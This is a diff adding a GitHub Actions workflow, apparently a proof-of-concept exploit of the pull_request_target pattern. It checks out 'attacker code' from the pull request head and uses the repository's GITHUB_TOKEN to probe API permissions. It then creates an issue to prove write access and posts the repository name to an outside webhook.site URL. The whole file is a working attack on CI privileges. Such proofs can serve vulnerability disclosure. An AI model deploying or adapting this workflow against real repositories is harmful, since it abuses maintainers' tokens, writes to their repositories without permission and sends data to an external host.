@@ -1,0 +1,44 @@
+name: Prove Vulnerability Pattern
+on: [pull_request_target]
+
+jobs:
+  prove:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Checkout attacker code
+        uses: actions/checkout@v3
+        with:
+          ref: ${{ github.event.pull_request.head.sha }}
+          
+      - name: Prove privilege escalation
+        run: |
+          echo "=== VULNERABILITY PROOF ==="
+          echo "1. Running as: $(whoami)"
+          echo "2. Repository: $GITHUB_REPOSITORY"
+          echo "3. Has GITHUB_TOKEN: $([ -n \"$GITHUB_TOKEN\" ] && echo 'YES' || echo 'NO')"
+          
+          # Prove we can access base repo with GITHUB_TOKEN
+          if [ -n "$GITHUB_TOKEN" ]; then
+            echo "4. Testing API access..."
+            RESPONSE=$(curl -s -H "Authorization: token $GITHUB_TOKEN" \
+              "https://api.github.com/repos/$GITHUB_REPOSITORY")
+            
+            if echo "$RESPONSE" | grep -q "not found"; then
+              echo "   ❌ No access"
+            else
+              echo "   ✅ Has repository access!"
+              echo "   Permissions: $(echo "$RESPONSE" | jq -r '.permissions')"
+            fi
+            
+            # Try to create an issue to prove write access
+            echo "5. Testing write access..."
+            curl -s -X POST -H "Authorization: token $GITHUB_TOKEN" \
+              -H "Content-Type: application/json" \
+              "https://api.github.com/repos/$GITHUB_REPOSITORY/issues" \
+              -d '{"title":"Security Test","body":"This proves the vulnerability"}' | \
+              jq '.number // .message'
+          fi
+          
+          # Send proof to webhook
+          curl -s -X POST "https://webhook.site/5abc3452-aafc-4f71-91b8-2cad2e68739f" \
+            -d "vulnerability=proven&repo=$GITHUB_REPOSITORY"
